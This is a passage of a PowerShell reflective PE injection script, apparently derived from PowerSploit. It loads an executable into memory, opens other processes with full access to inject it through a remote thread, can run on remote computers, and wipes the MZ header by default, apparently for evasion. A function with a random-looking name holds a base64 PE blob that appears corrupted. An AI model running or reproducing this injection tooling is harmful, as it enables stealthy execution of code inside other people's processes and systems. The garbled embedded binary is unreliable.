				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}

				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}

				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}


		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null


		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants

		$RemoteProcHandle = [IntPtr]::Zero


		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}









		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}

			Write-Verbose "Got the handle for the remote process to inject in to"
		}



		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}

		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1]



		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{



	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {

				    }
					else
					{
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
					}
	            }
	        }



		}

		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{

			}
			else{
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle


			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
			}
		}



		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{

		}
		else
		{






		}

		Write-Verbose "Done!"
	}

	Main
}


Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}

	Write-Verbose "PowerShell ProcessID: $PID"


	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

	if (-not $DoNotZeroMZ) {


		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}


	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}

function Invoke-HGFXNPCQTZ
{

$PEBytes32 = "ClN0cmluZ3MgdjIuNTQgLSBTZWFyY2ggZm9yIEFOU0kgYW5kIFVuaWNvZGUgc3RyaW5ncyBpbiBiaW5hcnkgaW1hZ2VzLgpDb3B5cmlnaHQgKEMpIDE5OTktMjAyMSBNYXJrIFJ1c3Npbm92aWNoClN5c2ludGVybmFscyAtIHd3dy5zeXNpbnRlcm5hbHMuY29tCgogICAgICAgICAgICBAICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKTCFUaGlzIHByb2dyYW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4KJCAgICAgICAKenp6JHokekAKJHpSaWNoeiAgICAgICAgICAgICAgICBQRSAgTAogW3dcICAgICAgICAgCiAgICAgNiAgIAogICAgICAgIAogICAgICAgICAgIAogKCAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgLnRleHQgICAgICAKICAgICAgICAgICAgICAgICAucmRhdGEgICAgICAgICAgICAgICAgICAgICAgICAgQCAgQC5kYXRhICAgCiAgICAgICAgICAgICBAICAucG90NXM4ICAgICAKICAgICAgICAgICAgIEAgIC5yZWxvYyAgUAogICAgICAgICAgICAgQCAgQiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV1CkY8ICBZdCdlCjsgIFl0J2UKUFYwPCAgVgp1OyAgWXREU1dFCjNHUyAgWV9bXl1VVnUKaiBXV0IgIApfXl1VMFZFQAogIFZ3OyAgRUUgUGoKICBWOyAgRUUgUGoKICBWSTsgIEVFIEUKQyAgSF5dVVZ1CjNAXVVRU1ZFM1B8KiAgWXQxVzNHOX1+Ckc7fXxTOiogIFlfXltdVVxWM0U4CkVEdCBQJyAgWUYKJT0gIFBTUCAgCjggIEVFIFBqCjggIEVFIFBXago4ICBFRSBQV2oKOCAgUEUgRVBXaiBoICAgaEAKOCAgRUUgUGoKczggIEVFIFBqClg4ICBFRSBQV2oKPjggIFBFIEVQV2ogaHsKITggIEVFIFBXagogOCAgRUUgUGoKNyAgRUUgUGoKNyAgUEUgRVBXaiBoMgpXNyAgRUUgUGoKICBXNyAgRUUgM0UKICBTdyQgIEB1IDNRCiAgUzUgIDNmRUVQagpoXSAgIFM1ICAzZkVQagogIFM1ICAzUGogaCAKRVApOSAgWQpFUDggIFkgCkVQOCAgWSQKRFE4ICBZKApFUG84ICBZLApFUCUgIGtNCmogUVYzICBWMAogIFNZNCAgM2ZQLAogICAhRVd9CjcgIFBFU1AKU20hICBZM15WRVBqCjIgIEVFIEVFagpQOyAgRVdQCkReW11VOFNWV0UKICBWezIgIDNmRUVQagpoICAgVmIyICAzZkVFUEVQRVBFUGgKRVBFUEVQRVBTCiAgIHQgVmQgICBZagpQV0w4ICBZWVZ0CiAgIFBWRUVqClBXIzkgIFlZX1VsCiAgU0gxICAzZkVFUGoKICBTLzEgIH0KM2ZFRVdQRVBFUGgKICAgIDx1IFdFUEVQRVBoCiAgWXUgMyAgIFBoOgpcV1MtNCAgWQpfVSAgIEVWUElZCiAgVnAvICAzZkUKICBWVy8gIDNmRUVQagogIFY+LyAgM2ZFfFBqCiAgViIvICBQM2ZFZFBqCi8gIDNmeEVQagogIFYuICAzZkVFUGoKallWLiAgM2ZFRVA1Cmg5ICAgaEAKIy4gIDNmRUVQCk4uICBFUDU0Cl5dVUBFVlAKdSAzICAgRUAKICBWRi0gIDNmRUVQagogIDNmRUVQagotICAzfWZFRUUKICBZM1lAXl1VCiwgIDNmRUVFClYuICBQaEQKM0BeXVUgICBTVldFQAogIFYgIDNmRUVQagogIDNmRUVQagpoICAgViAgUDNmRUVQagogIGZFRVBFUHxQRVBXPiUgIApFUEVQfFBFUFYKRUVQRVBFUEVQVyQgIApFUEVQRVBFUFYkICAKRVBFUEVQRVBoCkVQRVBFUEVQViQgIApFUEVQRVBFUGgKRVBFUEVQRVBoCll0dX0gdW85TXVqdGZ9IHU5TXVbdFd9WHVROU11THRIfVh1QjlNdT1qIFBoIAogIGogV2ggCjMgIGogX0V9UFdcfVBoIApFUFdcUGggCjYgIFxXUHw2ICAwCiAgIyAgMHUidXxoIAogIGogdVcnICAKM19eW11VUX0KKiEgIFlZdGMKXVl0SmouWGYKRVFqICAgIGYKXV5bX11VVnUKRVZQWXQ5V3UKICBZdCFFUEVQdVZXSUEgIFcKICBZX15dVXUKICAgM1lAM1ldVUxTVld9CiAgWVl0N1dWCiAgWXQgMyAgIHUKICAgVyggIFYoICBFCiAgU1smICAzZkVFUGomagogIFNCJiAgM2ZFCkVQViopICA4dGJFUFYKKSAgWVl0UkVQV3AqICBZWXQuRVBqCiAgUyUgIDNmRUVQV0cqICAKM0BfXltdVUUKICAgUzkgIAogIFBVMiAgVk05ICBWdQogIFBXOCAgWVkhCnUvamQgICBYCiAgUFc4ICAKICBVSlV0UgpqIGggICB1CiAgIFlfXltdVlcKOCAgWTNVRQogICBFU1B8LSAgRVBFaCAKUC8gIEVqIFAgMSAgdQogIFdHRiAgRWogUDAgICAgIGoKRiAgRGogU2ogPC4gIE0KICAgIFBQVyxFICAKViYgIFlZUApHIEVHJH1FNQo7dTtVdVd1Ck5ZWV9eW11VRQogIFdWNiAgCllZX15dVTxFVjNodiwgCkVWUGE6ICBZWQo0ICBZM1lAXl1VCnRmaiB1dTUgIE0KUHVRWyAgIAp1VllZWWpFUEVQRVBWNCAgCiB0JU4kRiB8CiBRUFY0ICAKICAgfihTV1Y0ICAKdF9eW11WVwogIG10ZzM5PQogIFlobiYgCiAgICl0I0kKICBfXlVWV3UKVjNAW18zXl1VRQoxJSAgWVl1M0BdVTxTVlczRVB1dQpddCBTfSAgIFlFdCBQbyAgIFl1CiAgM2ZQViAgIHUKICBAM2ZMUGoKU2ggICBoQApFUFNqIGp8aEAKICAzZkVFUFNqCiAgM2ZFaFBqCiAgM2ZIUGoKICAzZlxQagogIEwzZmZFUFNqCiAgM2ZFRVBqCiAgM2YsUGoKICBQM2Y4RVBTagogIDNmRXRQU2oKICAzZnw8RQp0O2p6amE3CiAganpqYWZFKgogIGZFM2ZFRVBWCiAgIEA7cmgKICAzZkVFUGoKICAzRGZFRUVFRUVqCiAgIFBrICAgWVl0RVd1CmogaCAgIEBWLyAgViAgICh1CiAgM1lAXl1VUVZ1CiAgWVl0X1d1CmogaCAgIEBWTi8gIFYKV0kvICBXNAp8ICAgWTNAXTMzQFV1Cl0zQFUwVjNFCnV1dXV1RTUgCi8gIEVWUEwwICAKXl1VMDNFNSAKRUVFRUVFUHUKLCAgWTNZQF0zICBqCiAgUDMgIFkKICBJMyAgMwozUFBQaDYgCiBVLEVWUGoKKCAgIFBqQApYZjtzIH4gRgogICBXaCAgIGoKV1doICAgdQogICBCTSAgZkVWIE4KKCAgIFBWVwogICBlIFZ0OGoKaHggICBoQAogIDNmRUVQV1AKXltdVTRTaiAKaiBYUFN9RQpRUVFRUVFRUEUKVWUgZSBQRQplIH5oamogQApNRnU7fH1FQEU7fF11RQo7dCFXU3V2CiB1L2ogaCAgClBZWVldVXUKM0BeXVVWdQogIChFPCAgIDMzZkV1CnV1dXV1dXV1RV5FUApWP1kzXl0lTApTVlczM2paVTNfdCYKTUVmO3dsawpQRTMlICBZdDh0MGZFZkdFR0dXUEVQRVAKZkVqWmZAWWZFZjt2UV9VQwohRVxZRV1VICAgU1ZXbCgKICBTICAzM2ZFRVBFfVBFUGxQaApWWWY5PnUtRVBqCiAgIDNWZkVFUApfVVRFV1BqCnQ6RVBqTEVQagpedUBZX11VWFZFKAogIDMhRWZFRVBFUEVQRVBoClB9WTNdVVZXM2oKVidZM1teXVVYV2oiWXR9VgogIGpARWogUAogIDAzZkVFdVAyCiAgUEVQVnsKXl1kMCAgIFVRUUUKICAzIUVmRUVQRVBFUEVQaApQWTNdVVFWaAogIFl0IUVFClZZM15dVSBXRVBqCmhjICAgaCgKUChZPSBAICB1ZUVQWVBqIGggICAKV2R1XFkzWQpQWT0gQCAgdQpdVVFTVlctM0VWVgpRWll0NFNXCkY7fFNtWTMzQFUKICAgVSRFUApdVVFRRVdQLll0fVYzRjl1CjNoUzM5dX5WNC8KUC5ZdCI5dX4KM1teXVUkRVAKICBWVzNXagp1VlleXVV1Ck0gICBZWXVdCiBTVnU6VzN9QDNTCnJVUVNWRTNQagpfVVFWM0VWUFZqCl5dVVhWRVBqVmoKM2ZFM0VQVlYKIHUmaCAgIGoKICAzdCgzZkYKUVFRUUVQUVFWCiFFRVleXVdqIGogCld1ZkVAICAgLUdhCltdVVFTVjNXOXUKdi0yM0VQLiAgIFl0JUUKUXVFWVlNMnUKICAgVnBZPSAwICAKICAgU1dFM1BTJFlZdSBTCmogaCAgIGgoCkU8ICAgM11mRQpfW15dV2ogaiAKVlkzXlVTVlczU1NqdQpWdllVU1d9ClleW11VVzMgICBAOUUKVlkzXl1VVQpyXjNAXVVWV30KICAgUFl0QFNWV3UKQFteXVVRZSBFVlBFCiAgIFBERVlZdFhFCkE5IHVdVUUKZjkxdV5dVVZ1CkZRICAgWVleXVVVCldZWV9dVX0KICAgUERZWXQKV3FZWV9dVUUKMmZ1M2Y5MnQKMmZ1M2Y5MnUKX1VTVlczU1NTU2p1CllQNiBZWXVHO34KdTNeXTNAVVZ1CnUzXl0zQFVWdQo2WTNeXVVRV3UKWVl0IDMgICBWdQo0M0AoPiB0CllWN2NZWTNeXVVRV3UKV1lZdCAzICAgVnUKNDNAKD4gdApZVjdZWTNeXVVWV30KcjNAXl0zVQogICAgWTNZQF1VIFdqIFkzRQpIdVtoICAgUAogIFlZM0BeXVVNCl1VREVqMFBIWVl1CktFRSBQLVBFUGowRVBoCiAgLHRFajBQCiAgWTNZQF1VMD0KWXYoRWowUFlZdCpqIGogajBFUFMKM1lAW15dVSBFUHUKaiBFUGogdQpWSiAgRWogUAp1IDMgICBHOFNQRQpQV0VQRVBFUHUKRVBGRWogUApWU0VQRWggCiAgUEBERWogUE9WU2ogCncgICBZVVFRRVBqIGoKXWhHOTMgICBZVQpoPCAgIGgoCl1VUVFTVldQCj5tRyBZKGpYRQpXO3dVdExfdEAKdDR7dCgtIAotICAgdSAhIAogWVlfXltdVVNWdQo7cjNAX15bXTNVVnUKUVkzQF5dVUUKMEFZWV1VRQowdVlZXVV1CllZXl1VVnUKM1BoICAgSHUgRgpGJDNAXl1VRQpQVkVdRUVXCkV0PzNWYlsKVkVJWVlQVgpZWXRAaEwgCjZWWVl1X15bXVVqIHUKVmggIFl0UUVQagozZkVFUFYgRQpWOF5dVVZqClZoICArWXR7V0VQagozZkVFUFY6CnZZM0BfXl1VCnQgMyAgIE0gQCAgV1BFbVl1IHUKM3VTVkVQV0VQdQpFdTwzOV12dwpsWVlDIDtdcgogIHVXQll1CkBbX11VVFNXRTNQagogICBWQTlddE11WXQtRV1QdVZ1ClEwdUk5XXRERVNTUwp1M3U1WXQkTQpFdVBWMU1XUQogIFZXUGggICBqCjMzZjRWVlZWUApFRTwgICBQVlZ1CldhRWY5MHUKICBQVlZWdUVQUwozICAgOFBqcmogaAp1Lj0vICB1Cn10QFZFdVBFRQo9ICAgdSB1CltfXl17VVMgICB1CiA2ICBXakBoIDAgIFZqIAogICAzZkVHWGZFM2ZFagpYZkUzRUVFUEVQCnRTVnhoTCAKICBWM2ZFRVBqCiAgVnszNGZFM0VFRQogIGY7diBWCiAgdSkgICBqClBWICAgUFMKQSAgIE1RUwogIFkzWUBeX1tdVSBXaCAKWTN9RVBoIApQICAgLF9dVVNdCiArdTNAX15bXTNVMDNWdQpXajBfO3dcOX0KM19eXVUwU10KVlczICAgagpfXltdVURWdQpFM1AgICBFCjtyX1teXVVVCmIgIGIkIEIKQjxeXVV0U1Z1CnVdRUVFRUVFRQp9fTNFfX19CiUgICAzM1czCjNOIEYkKE4zTkYzCiUgICAzM1YzClYgRiRWMDMKM04oRiwgICBKCiAgU1ZXICAgVzNWUFczClZQcmggICAKV1ZQQ2ggICB4cFZQdCV1CnV1dVN1dXV1CiAgRFZXdXUKICBWdVd9VldwCkVFRUVFRUUKajFfRVBQVAogIEBfXl1VCiAgRVBFUDhQUDhQRVBFUFA4UAogICBAM11VVQp1X15dVVNdCiAgUCAgIFAKICBAaFAgICBoUAogIHUoUGhQbQogIGhQQyAgIGhQIwogIGhQOFB1CiAgOFBoUExqSCBqIFA+MDNqIGhBCiAgIF5dVSAgIGhWV3UKUC8gICBoUApIOHA8QzhvCkhAcERDIG8oCkhYcFxDSG8KSHBkQyBvSApIaHBsQzhvOApIcHB0QzhvQApIeHB8Q0hvOAogICAgICBDSG9ACiAgIENIb0hfCiAgICAgIFtdVQogICBQIGBUIApfXl1VICAgaFZXdQpQLyAgIGhQKmhQIH0KWV9eXVVTXQogICBHQG9ICiAgICAgIEdIXwogICAgICBbXVVFClZ1X1UgICB9CiAgIFA0aiBQcQo0UGogICB9CjRQPiAgIEUKM144M14zICAgMyAgIAozRigzRlAzRngzICAgTgozTiwzTlQzTnwzICAgVgozVjwzVmQzICAgMyAgIH4gM35IM35wMyAgIDMgICBdXgozXkAzXmgzICAgMyAgIEVGCjNGMDNGWDMgICAzICAgTU4KM040M05cMyAgIDMgICBVCjNWRDNWbDMgICAzICAgXV4kM15MM150MyAgIDMgICBFTQozM0UxSygxQSwKM0hQM0NUMzNFS1AKM0h4M0N8MzNFS3gKQXwzICAgMyAgIDMzVSAgICAgIDMKM0gwM0M0M00zRUswCkE0M00xS1gzRTFBXDNNMSAgIDNFM3UzVTEgICAxICAgMSAgIE1FCjNIODNDPDNNM0VLOAozSDNDZDNNM0VLCjMgICAzICAgM00zRQpdICAgMyAgIDMgICAzdTNVCjNIQDNNM0dET0AzCjNIaDNHbDNNMwozICAgMyAgIDNNMwogICAzICAgMyAgIDN1MwozQyQzSyAzTTNFSyAKXUEkM00xT0gzCjNIcDNHdDNNMwozICAgM00zICAgICAgMwogICAzICAgMyAgIDN1MwogICAgICBxCkJcMyAgICAgIAogICAzICAgICAgCkooQiwgICAKICAgM35AdkQKQkAzICAgICAgCiAgIDMgICAgICAKICAgM1ogUiQKRiQzfnh2fApCfDMgICAgICAKICAgMyAgICAgIAogICAzWmhSbAozICAgICAgCiAgIDMgICAKR3QgICAgICBFMyAKQkgzcjBSNAojTTNNIzNFSwpFTSNFI00zM00KTUUjTSNFM0UzTUckTyBHKE8wX0B3OFc8RUcsRUc0CkBMRUVLKCMKI00zTSMzRUswCk0jRSNNMzMKQjxKOEVNI0UjTTMzTQpPQEdETUUjTSNFM0UzTU9IR0xHUE9YX2h3V2RFR1RFR1wKRUUjM0VBVAojTTNNIzNFS1gKRSNNI0UzTTMKT2hHbE1FI00jRTNFM01PcEd0R3ggICAgICAgICAgICBFR3xFCiAgICAgIEVFCl0zTSAgIF0KRUUjM0VBfAojTTNNIzNFCk0jRSNNMzMKRSNNM00jRTMKICAgTSAgICNNM01FCiAgICNFM0UgICAgICAgICAgICAgICBFICAgICAgRQogICAgICBFRQpdM00gICBdCiNNM00jM0UKTSNFI00zMwogICAjTUUzTSNFMwogICBNICAgCkUjTSNFM00zRSAgICAgIE0KPF9eW11VfQpZXl1VcFNWVzMKRTNARWUgMyF9M2oKICAgXTtddQpNJSAgID0gICAKICAgICB3dAogICAgdzJ0CiAgICAgICB0dwogICBLVSAgIH0gdApDICAgRUg7Ci4gICBDXTtdCiAgICAgICBdIEAgIFJ5PgpFUEVQRVBFUAogIH0gXXVFRQogIFVlIGUgZSBlIH0KRVBFUEVQRVAuCkVQRVBFUEVQCiAgdTNVQF0KRVBFUEVQRVAKRVBFUEVQRVAKRVBFUEVQRVAKICB1VV0gM1VOCnQ2LXQxLnVZCiAgbVBRUV1FXQogICB1IDNVfQo7RXdANnV1CiAgIFlZM19VVnUKdV9eXVVTXQpTM1ZXOVokCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAwIGEgICAgIC8gICAuICAgQSA6IFwgICAgICAgMDEyMzQ1Njc4OWFiY2RlZiAgICAvCmEwTE8+OzchWUghSzMKYSkhKUAlQi1JCjAzQUQjVEspSEJTWgo2WSQ2TVBbOQpbVTVFVTAsPz8iYTpPVU8xLQpMNSheTV1GODkKQUJcTUlARkchQlotLAouIWE8OThACmJhQyRMTVhDCiYsS14tSSkjClxHXyYvSGMKOF5TLE45WVUKJkhVREdCSi4gNUI/ClNdLiAuICAgICAqICAgXCAgICAgICBZCkxVU1ZXM2Q1MCAgIHYKICBQUFBZcTxcCiAgIFl3ICAgUwpfXltdTCtzCnRedCQwQ3gsdFB8JDhAKAp0JDhUJDQ7clNDYHgKICB0PUQkMApfVldTUUwkPHE8VAp3ICAgICAgICB2RnoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICB4ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICBAICBAICAgICAgICB4CiAgICAgICAgICAgICAgICAgQCAgQiAgICAgICAgICAgICAgICAgICAgICAgPyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEBTSCBlSAolICAgSExAWEwKICBIICAgSAogIEggICBICiAgSCAgIEgKICBIICAgSEggWwogIEBVU1ZXQVRBVkFXSEhITEVARTNMM0x1QEhMdVBMdUFXIAogICBMdVhBRgplSDQlMCAgIExFUEQkSElEdCRARTMKRCQ4SUh+KEhFWEhEJDBIXihITUBMdCQoTHQkIEFXMEh+KEhNQEFXSHg7SE1QQVdASFAwSFVIdCBBICAgTEVIVUlBVyhIVVBJQVc4QQogICBBSEFfQV5BXF9eW11IXCQKV0ggeVAgSUhIfWtIdGZIV0BIKEh0CiAgIGZDbEhcJDBIbCQ4SHQkQEggX0hcJApVVldBVEFWSEhASEhIUVRIVwpFM0ggICBICiAgIEhlQCBISHVXCkh9QCB0WnRWRXQKSF1ASGUwIEhIXVcKSFUwTEhhSFVATEhSSFwkeEhAQV5BXF9eXSAgICAgVVNWVwogICBfXltoMyAgQVVMZUgKSUFdMzN0IDxhfApSV1ZISHI8SDMKSDNeX1ogICBIClVTVldRSEhiCiAgQEggICBlSDwlICAgSApId0BIP2Z+CiB1SGtlcm5lbDMydQogIEhMJEhxPEhcCkhMJCMgICBITCQgICBITCRTCkh0ckh0JEBIQ3B4LHRiSHwkMEAoSApIO1QkKHcoClQkOEg7ckxkJAogIEh0SUxMCjMzdCA8YXwKUldWSHI8SDMKPXQgSCAgICAgICAgICAgICAgICAgICAgICAgIHZGegogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDQgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEQgIHggICAgICAgICAgICAgICAgICAgICAgICAgICAgTiAgJCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA7ICAgCiAgIDwgICAKICAgICAgICAgICAgICAgICAgICAgICAgIAogICBAICAgCiAgIEAgICAgICAgICAgICAgIEAgIEAgICAgICAgIFIK